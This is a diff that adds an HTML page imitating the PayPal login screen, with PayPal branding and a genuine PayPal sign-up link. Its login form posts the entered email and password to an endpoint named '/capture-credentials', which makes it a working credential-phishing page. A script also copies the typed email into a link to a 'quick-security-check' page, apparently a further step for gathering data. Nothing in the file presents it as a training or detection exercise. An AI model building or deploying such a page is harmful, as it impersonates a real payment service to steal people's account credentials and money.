@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Login</title>
+    <!-- Favicon -->
+    <link rel="icon" href="paypal tab icon.png" type="image/png">
+    <!-- Stylesheet -->
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <!-- Logo -->
+            <img src="paypal.png" alt="PayPal Logo">
+        </div>
+        <form class="login-form" action="/capture-credentials" method="POST">
+            <input type="email" name="email" placeholder="Email or mobile number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <a href="Forgot password/quick-security-check.html.html" class="forgot-password" id="forgotPasswordLink">Forgot password?</a>
+            <button type="submit" class="login-button">Log In</button>
+            <div class="separator">or</div>
+            <a href="https://www.paypal.com/us/webapps/mpp/account-selection" class="signup-link">
+                <button type="button" class="signup-button">Sign Up</button>
+            </a>
+        </form>
+        <div class="language-section">
+            <a href="#">English</a>
+            <a href="#">Français</a>
+            <a href="#">Español</a>
+            <a href="#">中文</a>
+        </div>
+    </div>
+    <footer>
+        <ul>
+            <li><a href="#">Contact Us</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Legal</a></li>
+            <li><a href="#">Policy Updates</a></li>
+            <li><a href="#">Worldwide</a></li>
+        </ul>
+    </footer>
+
+    <script>
+        const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+        const emailInput = document.querySelector('input[name="email"]');
+
+        // Update the "Forgot password?" link with the email as a query parameter
+        emailInput.addEventListener('input', () => {
+            forgotPasswordLink.href = `Forgot password/quick-security-check.html?email=${encodeURIComponent(emailInput.value)}`;
+        });
+    </script>
+</body>
+</html>
